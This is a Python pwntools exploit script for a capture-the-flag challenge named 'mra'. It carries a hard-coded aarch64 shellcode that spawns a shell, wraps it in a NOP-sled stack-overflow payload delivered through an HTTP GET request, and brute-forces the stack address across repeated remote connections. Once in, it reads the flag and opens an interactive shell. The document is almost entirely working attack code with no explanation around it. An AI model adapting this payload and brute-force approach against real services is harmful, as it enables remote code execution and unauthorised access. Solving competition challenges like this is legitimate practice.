#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'mra.challenges.ooo', 8000
binary = 'qemu-aarch64 -g 1234 ./mra'.split(" ")
brkpts = '''
'''

elf = ELF("mra")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "aarch64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

'''
if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary)
'''

fix = lambda a: a.replace("\x00", "%\x00\x00")

def pwn(io, stk):
    nop = p32(0xD503201F)
    stack = stk
    log.info("stack - > "+hex(stack))
    shellcode = "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
    
    payload = fix((nop*0x12 + shellcode).ljust(0x70, "\x90") + p64(stack)) + nop*(0x300/4) + shellcode
    
    s("GET /api/isodd/%\x00{}".format(payload))
    sleep(0.1)
    sl("cat flag*")
    print(io.recv())
    
    io.interactive()
    
if __name__ == "__main__":
    for i in range(0x4000800001, 0x40007f0001, -0x200):
        try:
            io = remote(remote_ip, port)
            pwn(io, i)
        except:
            io.close()
            continue
    
